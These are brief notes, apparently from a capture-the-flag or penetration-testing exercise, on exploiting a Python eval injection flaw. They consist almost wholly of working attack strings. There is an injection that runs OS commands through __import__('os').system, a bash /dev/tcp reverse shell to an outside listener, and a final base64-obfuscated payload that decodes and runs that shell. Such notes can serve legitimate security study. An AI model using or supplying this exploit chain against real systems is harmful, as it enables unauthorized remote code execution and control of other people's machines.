- Python injection :
- `') + str( <code>) #`
- ' to close query and then + str to enter into eval
-  # to comment everything after
- + operator to concatenate the output of another line separately.
	
- `') + str(__import__('os').system('id')) #`
- we get an output of user id 1000 svc

- now for reverse shell,
- open netcat listener or port you want

- exploit :
- `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`
- in base 64 :
- `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjE=`

- full exploit combining everything :

- `') + str(__import__('os').system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNC84ODg4IDA+JjE=| base64 -d|bash')) #`


- [ ] 2.1.1 (page 20)